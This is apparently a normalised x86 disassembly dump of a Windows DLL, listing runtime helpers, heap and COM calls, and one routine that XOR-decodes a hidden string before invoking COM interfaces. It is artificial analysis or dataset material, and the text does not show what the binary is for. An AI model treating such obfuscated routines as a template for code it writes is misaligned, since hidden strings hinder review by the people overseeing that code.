push ebp
mov ebp esp
push ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push edi
mov edi [ esi + 0x4 ]
push ecx
call sub_10026d80
mov edx [ esi ]
push edx
call sub_1006591f
add esp 0x8
pop edi
sub_10061060
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
pop esi
retn
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
sub_10061090
push ebp
mov ebp esp
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
lea edi [ ebp - 0xb0 ]
lea edx [ ebp - 0xb8 ]
mov esi ecx
mov [ ebp - 0xc0 ] eax
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb0 ] ebx
call sub_1002ae80
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov eax 0x36
mov [ ebp - 0xbc ] ebx
call sub_100050e0
lea ecx [ ebp - 0xbc ]
push ecx
push edx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa8 ]
lea eax [ ebx + 0x30 ]
call sub_100050e0
mov ebx 0x1
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax 0xe4
mov [ ebp - 0xb4 ] ebx
call sub_100050e0
lea eax [ ebp - 0xb4 ]
push eax
mov ecx edx
push ecx
call sub_100283d0
add esp 0x8
test eax eax
jne r-xdata
mov ebx 0x3
jmp r-xdata
mov edx [ ebp - 0xb8 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0xb0 ]
push eax
call esi
mov ecx [ ebp - 0xb4 ]
push ecx
call esi
mov edx [ ebp - 0xac ]
push edx
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x2c ]
mov eax 0x117
mov [ ebp - 0xac ] ebx
call sub_100050e0
lea edx [ ebp - 0xac ]
push edx
lea eax [ ebp - 0x2c ]
push eax
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
push 0x18
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov ebx 0x4
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0xac ]
push ecx
call sub_10055686
mov edx [ ebp - 0xb4 ]
mov ecx [ ebp - 0xb0 ]
add esp 0x4
push edx
mov edx [ ebp - 0xb8 ]
push ecx
mov ecx [ ebp - 0xbc ]
push edx
call sub_1005c290
jmp r-xdata
mov ecx [ ebp - 0xc0 ]
mov [ ecx ] eax
sub_10061207
push 0x3c
mov eax sub_1007f914
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10059065
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1006b2d6
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10069ce0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_100612be
push 0x4c
mov eax sub_1007f6fe
call sub_1001bb6b
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x44 ] eax
movzx eax [ ebp + 0x1c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x50 ]
push eax
mov ecx edi
mov [ ebp - 0x48 ] ebx
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_10004f60
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x40 ] eax
call sub_10069ce0
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10051f6c
mov al [ esi ]
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x38 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al 0x30
jne r-xdata
cmp [ edi + 0x24 ] 0x0
mov eax [ edi + 0x20 ]
jl r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x38 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
and [ ebp - 0x30 ] 0x0
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x38 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x40 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x58 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_1005ac87
mov ecx [ eax ]
push [ ebp - 0x30 ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x3c ]
xor esi esi
push eax
push ecx
push [ ebp - 0x44 ]
mov [ ebp + 0x14 ] eax
push ebx
mov [ edi + 0x20 ] esi
mov [ edi + 0x24 ] esi
call sub_100582fb
add esp 0x34
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
mov eax [ ebp - 0x44 ]
call sub_1004fa89
retn
cmp eax 0x100
lea eax [ ebp - 0x4c ]
je r-xdata
cmp eax [ ebp - 0x34 ]
jbe r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push [ ebp - 0x38 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_1003e9ec
mov ecx [ eax ]
push [ ebp - 0x30 ]
add esi [ ebp - 0x38 ]
push [ ebp - 0x3c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x38 ]
push [ eax ]
sub [ ebp - 0x34 ] ecx
lea eax [ ebp - 0x4c ]
push eax
push ebx
call sub_100582fb
add esp 0x30
push [ ebp - 0x30 ]
push [ ebp - 0x3c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_100582fb
add esp 0x18
jmp r-xdata
sub eax [ ebp - 0x34 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov ecx [ eax ]
and [ ebp - 0x30 ] 0x0
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ edi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
mov ebx [ ebp - 0x34 ]
jmp r-xdata
test al al
jle r-xdata
mov ebx [ ebp - 0x48 ]
mov ecx ebx
sub ecx [ ebp - 0x38 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub ebx eax
mov eax [ ebp - 0x34 ]
sub eax ebx
inc eax
push eax
lea ecx [ esi + ebx ]
push ecx
push eax
lea eax [ esi + ebx + 0x1 ]
push eax
mov [ ebp - 0x54 ] ecx
call sub_1003bb2a
mov eax [ ebp - 0x54 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x30 ]
add esp 0x10
inc [ ebp - 0x34 ]
inc eax
cmp [ eax ] 0x0
jle r-xdata
mov [ ebp - 0x30 ] eax
sub_100614ea
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_1002c59e
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_10061520
push 0x3c
mov eax sub_1007f914
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10030ef2
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100660be
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10069ce0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_100615e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f16b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x20
mov [ ebp - 0x10 ] 0x0
call sub_10055606
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov ecx eax
call sub_100659f0
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] eax
test edi edi
je r-xdata
mov eax [ rw-data ]
mov ecx [ esi ]
push eax
push edi
push ecx
call sub_1000710e
mov edx [ esi ]
mov [ edx + 0x10 ] 0x0
mov ecx [ esi ]
add esp 0xc
push r--data
add ecx 0x18
call sub_10055040
push 0x0
lea ecx [ ebp + 0x8 ]
call sub_100014b7
cmp [ rw-data ] 0x0
jne r-xdata
lea ecx [ ebp + 0x8 ]
call sub_10050f50
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
sub_100616ba
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_10050467
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100077c6
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_1004fd6f
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100617b0
push 0x0
push 0x0
call [ CoInitializeEx@IAT ]
mov [ esi ] eax
test eax eax
js r-xdata
mov eax [ esi ]
retn
lea eax [ esi + 0x4 ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
mov [ esi ] eax
test eax eax
jns r-xdata
call [ CoUninitialize@IAT ]
sub_100617e7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10061810
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_1002f4c0
mov [ esi + 0x4 ] edi
cmp [ ebx + 0x84 ] 0x8
jb r-xdata
add ebx 0x70
mov ebx [ ebx + 0x70 ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x14 ] eax
call sub_100796a0
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_1006189f
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0x8 ]
cmp edx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov ecx [ ecx ]
cmp ecx [ eax ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x4
sub_100618c0
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx ecx
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
mov edi [ ebp + 0x10 ]
movzx eax [ esi ]
push eax
mov ecx ebx
call sub_1000a0d8
mov [ edi ] ax
inc esi
add edi 0x2
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10061900
push ebp
mov ebp esp
push 0xffffffff
push sub_10080df2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10046ed0
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0xffffffff
xor eax eax
push edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] ax
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10046ed0
push 0xffffffff
xor esi esi
push edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] si
push eax
jmp r-xdata
call sub_10019180
sub_100619e0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x20 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ esi ] eax
xor edx edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebx ] ecx
mov eax [ esi ]
cmp eax edi
setne dl
mov [ ebp + 0x14 ] edx
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
mov ecx [ ebx ]
cmp ecx [ ebp + 0x1c ]
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ esi ]
add edx 0x8
push edx
mov edx [ ebp + 0x8 ]
push edx
mov edx edi
sub edx eax
push edx
push eax
push ecx
call sub_100306ed
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
mov [ esi ] edi
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn 0x1c
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov ecx [ ebx ]
cmp [ ecx ] ax
jne r-xdata
add [ esi ] eax
add [ ebx ] 0x2
mov [ ebp + 0x14 ] 0x0
cmp [ esi ] edi
jne r-xdata
xor eax eax
mov eax [ esi ]
lea edx [ eax + 0x1 ]
mov edi edi
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
sub_10061a99
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
sub eax [ ebp + 0x8 ]
sar eax 0x1
push eax
push [ ebp + 0x8 ]
push 0x1
call [ GetStringTypeW@IAT ]
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_10061aba
push 0x28
mov eax sub_1007f6b0
call sub_100097c8
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x3
pop eax
call sub_1004db01
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x4 ] ebx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x28 ] bl
call sub_1004de1d
mov [ esi ] r--data
jmp r-xdata
sub_10061b50
push ebp
mov ebp esp
push 0xffffffff
push sub_1008251b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov edx [ edi ]
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov esi [ edx + 0x4 ]
add esi edi
call sub_10037ab0
mov eax [ ebp + 0xc ]
mov ecx esi
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] ebx
call sub_1005a4a0
mov [ esi + 0x40 ] al
cmp [ esi + 0x38 ] ebx
jne r-xdata
mov ecx [ edi + 0x10 ]
mov edx [ ecx + 0x4 ]
mov [ edi + edx + 0x10 ] r--data
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0xc ]
or eax 0x4
or eax 0x4
and eax 0x17
mov [ esi + 0xc ] eax
test [ esi + 0x10 ] eax
je r-xdata
push ebx
mov ecx esi
call sub_1003c700
sub_10061c00
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub ebx esi
push edi
push esi
push ebx
call sub_1004d631
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub edi eax
mov eax edi
pop edi
cmp edi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002fec0
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002fec0
add esp 0x10
inc esi
test edi edi
je r-xdata
sub_10061cc0
push ebp
mov ebp esp
sub esp 0xbc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push ebx
xor ebx ebx
push esi
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xb0 ] ebx
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x50
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0x12
jb r-xdata
xor eax eax
lea edx [ ebp - 0xb0 ]
push edx
mov [ ebp - 0x18 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x3c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
cmp [ edi + 0x118 ] 0x8
lea eax [ edi + 0x104 ]
jb r-xdata
mov ecx 0x3
lea edx [ ebp - 0x58 ]
mov eax 0x9c
mov [ ebp - 0x14 ] cx
lea esi [ ecx - 0x2 ]
call sub_100050e0
mov ebx [ ebp - 0x14 ]
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
lea eax [ ebp - 0xb0 ]
push eax
push r--data
lea eax [ ebp - 0x58 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x8 ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] esi
call ecx
test eax eax
je r-xdata
push eax
call [ SysAllocString@IAT ]
mov esi eax
mov eax [ ebp - 0xb0 ]
mov edx [ eax ]
push esi
push eax
mov eax [ edx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0x87
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb4 ] ebx
call sub_100050e0
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xb8 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ eax ]
xor ebx ebx
lea edx [ ebp - 0xac ]
mov eax 0xa1
call sub_100050e0
mov esi 0x1
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xb8 ]
mov ecx [ eax ]
lea edx [ ebp - 0xb4 ]
push edx
mov edx [ ebp - 0xb0 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0xb4 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0xcc
call sub_100050e0
mov [ ebp - 0xbc ] 0x2
jmp r-xdata
mov eax [ ebp - 0xb0 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xb8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xb4 ] ebx
push esi
call [ SysFreeString@IAT ]
mov esi [ ebp - 0xbc ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_10061e8a
push 0x28
mov eax sub_1007f6b0
call sub_100097c8
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x3
pop eax
call sub_1004db01
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x4 ] ebx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x28 ] bl
call sub_1004de1d
mov [ esi ] r--data
jmp r-xdata
sub_10061f1f
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
